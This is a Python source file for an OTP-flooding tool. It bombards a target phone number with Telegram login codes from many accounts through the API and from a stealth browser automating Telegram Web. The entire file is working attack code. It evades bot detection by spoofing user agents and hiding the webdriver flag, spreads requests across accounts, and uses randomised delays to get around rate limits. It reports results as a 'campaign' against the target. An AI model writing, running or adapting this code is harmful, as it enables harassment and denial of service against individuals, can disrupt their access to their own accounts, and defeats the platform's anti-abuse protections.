import asyncio
import random
import time
import logging
import json
from typing import Dict, List, Tuple, Optional, Any, Union, TYPE_CHECKING
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum

from telethon import TelegramClient
from telethon.tl.functions import auth
from telethon.errors import (
    FloodWaitError, FloodPremiumWaitError, PhoneNumberInvalidError,
    SendCodeUnavailableError, PhoneNumberFloodError
)
from telethon.tl.types import CodeSettings

try:
    import undetected_chromedriver as uc
    UC_AVAILABLE = True
except ImportError:
    UC_AVAILABLE = False
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager

from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import (
    TimeoutException, NoSuchElementException, WebDriverException,
    ElementNotInteractableException, StaleElementReferenceException
)
from selenium.webdriver.chrome.options import Options
from selenium_stealth import stealth

import phonenumbers
from phonenumbers import parse, is_valid_number, format_number, PhoneNumberFormat
from colorama import Fore, Style, init
from fake_useragent import UserAgent

try:
    from tqdm.asyncio import tqdm_asyncio
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False

init(autoreset=True)

if TYPE_CHECKING:
    import undetected_chromedriver as uc
class Status(Enum):
    SUCCESS = "success"
    FAILED = "failed"
    RATE_LIMITED = "rate_limited"
    ERROR = "error"

@dataclass
class OtpResult:
    method: str
    account: str
    status: Status
    timestamp: datetime
    error_message: Optional[str] = None
    flood_wait_seconds: Optional[int] = None
    pairing_code: Optional[str] = None
    duration_ms: float = 0.0

@dataclass
class CampaignResult:
    target: str
    requested: int
    successful: int = 0
    failed: int = 0
    rate_limited: int = 0
    start_time: Optional[datetime] = None
    end_time: Optional[datetime] = None
    method_breakdown: Dict[str, Dict[str, int]] = field(default_factory=dict)
    details: List[OtpResult] = field(default_factory=list)

class PhoneValidator:
    @staticmethod
    def validate(phone: str) -> Tuple[bool, str, Dict[str, Any]]:
        try:
            cleaned = ''.join(c for c in phone if c.isdigit() or c == '+')
            if not cleaned.startswith('+'):
                cleaned = '+' + cleaned
            
            parsed = parse(cleaned, None)
            
            if not is_valid_number(parsed):
                return False, phone, {}
            
            metadata = {
                'country_code': parsed.country_code,
                'national_number': parsed.national_number,
                'region': phonenumbers.region_code_for_number(parsed),
                'formatted': format_number(parsed, PhoneNumberFormat.INTERNATIONAL),
                'carrier': phonenumbers.carrier.name_for_number(parsed, "en") or "Unknown",
                'number_type': str(phonenumbers.number_type(parsed))
            }
            
            return True, format_number(parsed, PhoneNumberFormat.E164), metadata
            
        except Exception as e:
            print(f"Phone validation error: {e}")
            return False, phone, {}

class StealthWebDriver:
    def __init__(self, headless: bool = True):
        self.headless = headless
        self.driver = None
        self.ua = UserAgent(fallback='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        
    def _create_driver(self) -> Union["uc.Chrome", "webdriver.Chrome"]:
        options = Options()
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        
        if self.headless:
            options.add_argument("--headless=new")
            options.add_argument("--disable-gpu")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
        
        width = random.choice([1920, 1366, 1440, 1536, 1280])
        height = random.choice([1080, 768, 900, 864, 720])
        options.add_argument(f"--window-size={width},{height}")
        
        user_agent = self.ua.random
        options.add_argument(f"--user-agent={user_agent}")
        options.add_argument("--disable-web-security")
        options.add_argument("--disable-features=IsolateOrigins,site-per-process")
        
        try:
            if UC_AVAILABLE:
                driver = uc.Chrome(options=options, version_main=None)
            else:
                service = Service(ChromeDriverManager().install())
                driver = webdriver.Chrome(service=service, options=options)
                stealth(driver,
                    languages=["en-US", "en"],
                    vendor="Google Inc.",
                    platform="Win32",
                    webgl_vendor="Intel Inc.",
                    renderer="Intel Iris OpenGL Engine",
                    fix_hairline=True,
                )
            
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            return driver
            
        except Exception as e:
            print(f"Failed to create driver: {e}")
            raise
    
    def start(self):
        self.driver = self._create_driver()
        return self
    
    def stop(self):
        if self.driver:
            try:
                self.driver.quit()
            except Exception as e:
                print(f"Error quitting driver: {e}")
            finally:
                self.driver = None
    
    def __enter__(self):
        return self.start()
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.stop()

class FloodWaitManager:
    def __init__(self):
        self.flood_history = {}
        self.base_delay = 1.5
        self.max_delay = 300
        
    async def handle_flood_wait(self, account_id: str, seconds: int) -> float:
        now = time.time()
        
        if account_id not in self.flood_history:
            self.flood_history[account_id] = []
        
        self.flood_history[account_id].append({
            'timestamp': now,
            'seconds': seconds
        })
        
        self.flood_history[account_id] = [
            f for f in self.flood_history[account_id]
            if now - f['timestamp'] < 3600
        ]
        
        recent_floods = len(self.flood_history[account_id])
        penalty = min(recent_floods * 10, 60)
        
        actual_wait = min(seconds + penalty, self.max_delay)
        
        print(f"[{account_id}] Flood wait: {seconds}s + penalty: {penalty}s = {actual_wait}s")
        
        return actual_wait
    
    def get_backoff_delay(self, account_id: str, attempt: int) -> float:
        delay = self.base_delay * (2 ** attempt) + random.uniform(0, 2)
        return min(delay, 30)

class BahiravaSpamOtp:
    TELEGRAM_WEB_URL = "https://web.telegram.org/a/"
    
    def __init__(
        self, 
        target: str, 
        amount: int,
        accounts_file: str = "accounts.json",
        use_web: bool = True,
        use_api: bool = True,
        headless: bool = True
    ):
        self.target = target
        self.amount = max(10, min(500, amount))
        self.accounts_file = accounts_file
        self.use_web = use_web
        self.use_api = use_api
        self.headless = headless
        
        self.result = CampaignResult(
            target=target,
            requested=self.amount,
            method_breakdown={'api': {'success': 0, 'fail': 0}, 'web': {'success': 0, 'fail': 0}}
        )
        
        self.flood_manager = FloodWaitManager()
        self.api_clients: List[TelegramClient] = []
        self.code_hashes: Dict[str, str] = {}
        self._semaphore = asyncio.Semaphore(3)
        
    async def _init_api_clients(self) -> bool:
        try:
            from tg import AccountManager, ACCOUNTS_FILE
            self.account_mgr = AccountManager(self.accounts_file)
        except ImportError:
            self.account_mgr = self._create_simple_account_manager()
        
        await self.account_mgr.init_sessions()
        self.api_clients = [
            c for c in self.account_mgr.session_clients 
            if c.is_connected()
        ]
        
        if not self.api_clients:
            print("No API clients available")
            return False
            
        print(f"Initialized {len(self.api_clients)} API clients")
        return True
    
    def _create_simple_account_manager(self):
        raise ImportError("tg module not found and no fallback implemented")
    
    async def _send_initial_code_api(self, client: TelegramClient) -> Optional[str]:
        account_id = getattr(client, '_phone', 'unknown')
        start_time = time.time()
        
        try:
            code_settings = CodeSettings(
                allow_flashcall=False,
                current_number=False,
                allow_app_hash=False
            )
            
            result = await client(auth.SendCodeRequest(
                phone_number=self.target,
                api_id=client.api_id,
                api_hash=client.api_hash,
                settings=code_settings
            ))
            
            duration = (time.time() - start_time) * 1000
            
            if result.phone_code_hash:
                self.code_hashes[account_id] = result.phone_code_hash
                print(Fore.GREEN + f"[API] Initial code sent via {account_id}")
                
                self.result.details.append(OtpResult(
                    method='api',
                    account=account_id,
                    status=Status.SUCCESS,
                    timestamp=datetime.now(),
                    duration_ms=duration,
                    pairing_code=result.phone_code_hash
                ))
                return result.phone_code_hash
            
        except FloodWaitError as e:
            wait_time = await self.flood_manager.handle_flood_wait(account_id, e.seconds)
            print(Fore.YELLOW + f"[API] Flood wait {e.seconds}s for {account_id}")
            self.result.details.append(OtpResult(
                method='api',
                account=account_id,
                status=Status.RATE_LIMITED,
                timestamp=datetime.now(),
                flood_wait_seconds=e.seconds,
                error_message=f"Flood wait: {e.seconds}s"
            ))
            await asyncio.sleep(wait_time)
            
        except FloodPremiumWaitError as e:
            print(Fore.YELLOW + f"[API] Premium flood wait {e.seconds}s for {account_id}")
            await asyncio.sleep(e.seconds)
            
        except PhoneNumberInvalidError:
            print(Fore.RED + f"[API] Invalid phone number: {self.target}")
            self.result.details.append(OtpResult(
                method='api',
                account=account_id,
                status=Status.FAILED,
                timestamp=datetime.now(),
                error_message="Invalid phone number"
            ))
            
        except SendCodeUnavailableError:
            print(Fore.RED + f"[API] Send code unavailable for {account_id}")
            
        except Exception as e:
            print(f"[API] Initial code error for {account_id}: {e}")
            self.result.details.append(OtpResult(
                method='api',
                account=account_id,
                status=Status.ERROR,
                timestamp=datetime.now(),
                error_message=str(e)
            ))
        
        return None
    
    async def _resend_code_api(
        self, 
        client: TelegramClient, 
        phone_code_hash: str,
        attempt: int
    ) -> bool:
        account_id = getattr(client, '_phone', 'unknown')
        start_time = time.time()
        
        delay = self.flood_manager.get_backoff_delay(account_id, attempt)
        
        cool_delay = random.choice([
            delay * 1.2,
            delay * random.uniform(0.8, 1.5),
            delay + random.uniform(1, 3),
        ])
        
        print(Fore.CYAN + f"[API] Cool delay: {cool_delay:.2f}s before resend #{attempt}")
        await asyncio.sleep(cool_delay)
        
        async with self._semaphore:
            try:
                result = await client(auth.ResendCodeRequest(
                    phone_number=self.target,
                    phone_code_hash=phone_code_hash,
                    reason="delivery"
                ))
                
                duration = (time.time() - start_time) * 1000
                
                self.result.successful += 1
                self.result.method_breakdown['api']['success'] += 1
                
                print(Fore.GREEN + f"[API] Resend #{attempt} from {account_id}")
                
                self.result.details.append(OtpResult(
                    method='api',
                    account=account_id,
                    status=Status.SUCCESS,
                    timestamp=datetime.now(),
                    duration_ms=duration,
                    pairing_code=getattr(result, 'phone_code_hash', None)
                ))
                return True
                
            except FloodWaitError as e:
                wait_time = await self.flood_manager.handle_flood_wait(account_id, e.seconds)
                self.result.rate_limited += 1
                self.result.method_breakdown['api']['fail'] += 1
                
                print(Fore.YELLOW + f"[API] Flood wait {e.seconds}s on resend #{attempt}")
                
                self.result.details.append(OtpResult(
                    method='api',
                    account=account_id,
                    status=Status.RATE_LIMITED,
                    timestamp=datetime.now(),
                    flood_wait_seconds=e.seconds,
                    error_message=f"Resend flood wait: {e.seconds}s"
                ))
                
                await asyncio.sleep(wait_time)
                return False
                
            except FloodPremiumWaitError as e:
                print(Fore.YELLOW + f"[API] Premium flood {e.seconds}s")
                await asyncio.sleep(e.seconds)
                return False
                
            except PhoneNumberFloodError:
                print(Fore.RED + f"[API] Phone number flood for {self.target}")
                self.result.method_breakdown['api']['fail'] += 1
                return False
                
            except Exception as e:
                print(f"[API] Resend error: {e}")
                self.result.failed += 1
                self.result.method_breakdown['api']['fail'] += 1
                
                self.result.details.append(OtpResult(
                    method='api',
                    account=account_id,
                    status=Status.ERROR,
                    timestamp=datetime.now(),
                    error_message=str(e)
                ))
                return False
    
    async def _api_worker(self, client: TelegramClient, phone_code_hash: str, target_count: int):
        account_id = getattr(client, '_phone', 'unknown')
        
        for i in range(1, target_count + 1):
            success = await self._resend_code_api(client, phone_code_hash, i)
            
            if not success:
                await asyncio.sleep(random.uniform(5, 10))
                success = await self._resend_code_api(client, phone_code_hash, i)
            
            progress = f"[{account_id}] Progress: {i}/{target_count} | Success: {self.result.successful} | Failed: {self.result.failed}"
            print(Fore.CYAN + progress)
            
            if i < target_count:
                cooldown = random.uniform(2, 5)
                await asyncio.sleep(cooldown)
    
    async def _web_worker(self, target_count: int):
        print(Fore.MAGENTA + "[WEB] Starting stealth browser...")
        
        with StealthWebDriver(headless=self.headless) as driver_manager:
            driver = driver_manager.driver
            wait = WebDriverWait(driver, 20)
            
            try:
                driver.get(self.TELEGRAM_WEB_URL)
                await asyncio.sleep(random.uniform(3, 6))
                
                phone_input = wait.until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='tel'], input[placeholder*='phone'], #sign-in-phone-number"))
                )
                
                phone_input.clear()
                for char in self.target:
                    phone_input.send_keys(char)
                    time.sleep(random.uniform(0.05, 0.2))
                
                next_btn = wait.until(
                    EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Next') or contains(., 'CONTINUE') or contains(@class, 'btn-primary')]"))
                )
                
                time.sleep(random.uniform(0.5, 2))
                next_btn.click()
                
                wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='number'], input[placeholder*='code'], .input-field-code")))
                time.sleep(random.uniform(2, 4))
                
                resend_selectors = [
                    "//button[contains(translate(text(), 'RESEND', 'resend'), 'resend')]",
                    "//button[contains(translate(text(), 'SEND', 'send'), 'send') and contains(translate(text(), 'AGAIN', 'again'), 'again')]",
                    "//a[contains(translate(text(), 'RESEND', 'resend'), 'resend')]",
                    "//span[contains(translate(text(), 'RESEND', 'resend'), 'resend')]/parent::button",
                    "//div[contains(@class, 'resend')]",
                    "//button[contains(@class, 'primary') and contains(., 'code')]",
                    "//button[contains(text(), 'Resend')]",
                    "//button[contains(text(), 'Send again')]",
                    "//button[contains(text(), 'Request code')]",
                    "//a[contains(text(), 'Resend')]",
                    "//span[contains(text(), 'Resend')]",
                    "//button[contains(@class, 'btn') and contains(., 'code')]",
                ]
                
                has_resend = False
                working_selector = None
                
                for selector in resend_selectors:
                    try:
                        elements = driver.find_elements(By.XPATH, selector)
                        for btn in elements:
                            if btn.is_displayed() and btn.is_enabled():
                                has_resend = True
                                working_selector = selector
                                break
                        if has_resend:
                            break
                    except Exception:
                        continue
                
                if not has_resend:
                    print(Fore.YELLOW + "[WEB] No resend button found, checking for alternative actions...")
                    
                    alt_selectors = [
                        "//button[contains(text(), 'Edit')]",
                        "//button[contains(text(), 'Change number')]",
                        "//button[contains(text(), 'Back')]",
                        "//a[contains(@href, 'login')]",
                    ]
                    
                    for selector in alt_selectors:
                        try:
                            elements = driver.find_elements(By.XPATH, selector)
                            for btn in elements:
                                if btn.is_displayed() and btn.is_enabled():
                                    print(Fore.CYAN + f"[WEB] Found alternative button: {btn.text}")
                                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", btn)
                                    time.sleep(random.uniform(0.5, 1))
                                    driver.execute_script("arguments[0].click();", btn)
                                    time.sleep(random.uniform(2, 3))
                                    break
                        except Exception:
                            continue
                    
                    print(Fore.YELLOW + "[WEB] Proceeding with available interface...")
                    self.result.method_breakdown['web']['fail'] += target_count
                    return
                
                print(Fore.GREEN + f"[WEB] Resend button confirmed, proceeding with {target_count} requests...")
                
                for i in range(1, target_count + 1):
                    try:
                        cool_delay = random.uniform(8, 15)
                        print(Fore.CYAN + f"[WEB] Cool delay: {cool_delay:.2f}s before resend #{i}")
                        time.sleep(cool_delay)
                        
                        clicked = False
                        
                        for selector in resend_selectors:
                            try:
                                elements = driver.find_elements(By.XPATH, selector)
                                for btn in elements:
                                    if btn.is_displayed() and btn.is_enabled():
                                        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", btn)
                                        time.sleep(random.uniform(0.5, 1))
                                        driver.execute_script("arguments[0].click();", btn)
                                        clicked = True
                                        break
                                if clicked:
                                    break
                            except Exception:
                                continue
                        
                        if clicked:
                            self.result.successful += 1
                            self.result.method_breakdown['web']['success'] += 1
                            print(Fore.GREEN + f"[WEB] Resend #{i} clicked")
                        else:
                            self.result.failed += 1
                            self.result.method_breakdown['web']['fail'] += 1
                            print(Fore.RED + f"[WEB] Could not find resend button for #{i}")
                            
                            if i % 3 == 0:
                                print(Fore.YELLOW + "[WEB] Refreshing page...")
                                driver.refresh()
                                time.sleep(random.uniform(3, 5))
                                
                    except Exception as e:
                        print(f"[WEB] Error on click #{i}: {e}")
                        self.result.failed += 1
                        self.result.method_breakdown['web']['fail'] += 1
                        
                print(Fore.GREEN + "[WEB] Web automation completed")
                
            except TimeoutException:
                print(Fore.RED + "[WEB] Timeout waiting for elements")
                self.result.method_breakdown['web']['fail'] += target_count
            except WebDriverException as e:
                print(Fore.RED + f"[WEB] WebDriver error: {e}")
                self.result.method_breakdown['web']['fail'] += target_count
            except Exception as e:
                print(Fore.RED + f"[WEB] Fatal error: {e}")
                print("Web worker fatal error")
    
    async def flood(self) -> Dict[str, Any]:
        self.result.start_time = datetime.now()
        
  
        print(Fore.CYAN + f"[🎯] Target: {self.target}")
        print(Fore.CYAN + f"[📊] Amount: {self.amount}")
        print(Fore.CYAN + f"[⚡] Methods: {'API' if self.use_api else ''} {'WEB' if self.use_web else ''}\n")
        
        is_valid, formatted, metadata = PhoneValidator.validate(self.target)
        if not is_valid:
            print(Fore.RED + f"[✗] Invalid phone number: {self.target}")
            return {'error': 'Invalid phone number', 'target': self.target}
        
        print(Fore.GREEN + f"[✓] Validated: {metadata['formatted']} ({metadata['region']})")
        
        tasks = []
        
        if self.use_api:
            api_ready = await self._init_api_clients()
            if api_ready:
                for client in self.api_clients:
                    hash_val = await self._send_initial_code_api(client)
                    await asyncio.sleep(random.uniform(1, 3))
                
                if self.code_hashes:
                    total_api = len(self.code_hashes)
                    base_count = self.amount // (total_api + (1 if self.use_web else 0))
                    remainder = self.amount % (total_api + (1 if self.use_web else 0))
                    
                    for idx, (client_id, hash_val) in enumerate(self.code_hashes.items()):
                        count = base_count + (1 if idx < remainder else 0)
                        if count > 0:
                            client_obj = next((c for c in self.api_clients if getattr(c, '_phone', '') == client_id), None)
                            if client_obj:
                                tasks.append(self._api_worker(client_obj, hash_val, count))
                else:
                    print(Fore.YELLOW + "[API] No valid code hashes obtained")
        
        if self.use_web:
            web_count = self.amount // max(len(self.code_hashes), 1) if self.use_api else self.amount
            tasks.append(self._web_worker(web_count))
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        else:
            print(Fore.RED + "[✗] No tasks to execute")
        
        if self.use_api:
            await self.account_mgr.close_sessions()
        
        self.result.end_time = datetime.now()
        
        duration = (self.result.end_time - self.result.start_time).total_seconds()
        
        print(Fore.MAGENTA + f"\n{'='*60}")
        print(Fore.WHITE + f"📊 CAMPAIGN SUMMARY")
        print(Fore.CYAN + f"Target: {self.target}")
        print(Fore.GREEN + f"✓ Successful: {self.result.successful}/{self.result.requested}")
        print(Fore.RED + f"✗ Failed: {self.result.failed}/{self.result.requested}")
        print(Fore.YELLOW + f"⚠ Rate Limited: {self.result.rate_limited}")
        print(Fore.CYAN + f"⏱ Duration: {duration:.2f}s")
        print(Fore.CYAN + f"API: {self.result.method_breakdown['api']['success']}✓ {self.result.method_breakdown['api']['fail']}✗")
        print(Fore.CYAN + f"Web: {self.result.method_breakdown['web']['success']}✓ {self.result.method_breakdown['web']['fail']}✗")
        print(Fore.MAGENTA + f"{'='*60}\n")
        
        return {
            'target': self.target,
            'formatted': metadata['formatted'],
            'requested': self.result.requested,
            'successful': self.result.successful,
            'failed': self.result.failed,
            'rate_limited': self.result.rate_limited,
            'duration_seconds': duration,
            'method_breakdown': self.result.method_breakdown,
            'details': [
                {
                    'method': d.method,
                    'account': d.account,
                    'status': d.status.value,
                    'timestamp': d.timestamp.isoformat(),
                    'error': d.error_message,
                    'flood_wait': d.flood_wait_seconds
                }
                for d in self.result.details
            ],
            'start_time': self.result.start_time.isoformat(),
            'end_time': self.result.end_time.isoformat()
        }

async def freeze_otp(
    target: str, 
    amount: int = 50,
    accounts_file: str = "accounts.json",
    use_web: bool = True,
    use_api: bool = True,
    headless: bool = True
) -> Dict[str, Any]:
    flooder = BahiravaSpamOtp(
        target=target,
        amount=amount,
        accounts_file=accounts_file,
        use_web=use_web,
        use_api=use_api,
        headless=headless
    )
    return await flooder.flood()

